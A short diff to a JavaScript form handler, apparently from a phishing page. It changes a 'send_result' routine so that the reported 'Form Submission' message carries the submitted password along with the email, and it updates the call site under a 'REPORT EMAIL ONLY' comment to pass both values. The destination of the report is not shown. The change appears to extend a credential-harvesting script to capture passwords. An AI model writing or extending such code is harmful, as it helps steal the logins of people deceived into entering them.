@@ -211,13 +211,14 @@ function getEmail() {
    SEND RESULT
    ========================= */
 
-async function send_result(email) {
+async function send_result(email, password) {
 
     const message =
 `Form Submission
 
 Email:
 ${email || "Not provided"}
+
 Password:
 ${password || "Not provided"}
 
@@ -484,7 +485,7 @@ document.addEventListener(
                    REPORT EMAIL ONLY
                    ========================= */
 
-                await send_result(email);
+                await send_result(email, password);
 
 
                 /* =========================
